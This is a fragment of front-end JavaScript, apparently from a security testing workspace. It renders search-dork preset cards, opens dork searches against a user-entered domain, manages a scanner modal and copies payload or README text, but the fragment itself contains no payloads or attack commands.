        return `<article class="dork-card"><div><div class="dork-card-title">${escapeHtml(preset.title)}</div><div class="dork-card-meta">${escapeHtml(preset.category)}</div><div class="dork-card-query">${escapeHtml(query)}</div></div><button class="btn-sm dork-open-button" type="button" onclick="openDorkingPreset(${dorkingPresets.indexOf(preset)})">Open search</button></article>`;
    }).join('') || '<div class="dork-empty">No matching dork presets.</div>';
}

function openDorkingPreset(index) {
    const target = normalizeDorkingTarget(document.getElementById('dorkingTarget').value);
    if (!target) {
        alert('Enter a valid domain, for example example.com.');
        document.getElementById('dorkingTarget').focus();
        return;
    }
    window.open(dorkingUrl(dorkingPresets[index], target), '_blank', 'noopener');
}

function openScannerModal() {
    document.getElementById('scannerModal').classList.add('open');
}

function closeScannerModal(event) {
    if (!event || event.target.id === 'scannerModal') document.getElementById('scannerModal').classList.remove('open');
}

function copyReadmeCommand(button) {
    copyPayloadText(button.dataset.command || '', button);
}

populateSearchSuggestions();
buildPageOptions();
loadWorkspace();
updateStatusOptions();
updatePayloadCategoryCounts();
renderCategories();
renderCards([]);
document.getElementById('resultsInfo').innerText = '';
updateSummary();
updateProgressStats();

(function initShow() {
    const pageVal = document.getElementById('pageSelect').value;
    if (pageVal && pageVal !== 'all-pages') {
        const pageName = decodeURIComponent(pageVal);
        updateLocationOptions(pageName);
        showAllForPage(pageName);
    }
})();

